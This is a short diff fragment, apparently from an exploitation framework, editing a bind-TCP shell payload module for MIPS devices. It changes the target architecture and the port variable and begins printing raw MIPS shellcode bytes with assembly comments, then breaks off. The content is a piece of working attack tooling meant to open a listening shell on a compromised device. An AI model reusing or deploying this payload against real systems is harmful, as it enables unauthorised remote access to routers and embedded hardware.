@@ -18,10 +18,10 @@ class Exploit(BindTCPPayloadMixin, ArchitectureSpecificPayload):
         ],
     }
 
-    architecture = Architectures.MIPSBE
+    architecture = Architectures.MIPSLE
 
     def generate(self):
-        bind_port = validators.convert_port(self.lport)
+        bind_port = validators.convert_port(self.rport)
         return (
             "\xe0\xff\xbd\x27" +  # addiu   sp,sp,-32
             "\xfd\xff\x0e\x24" +  # li      t6,-3
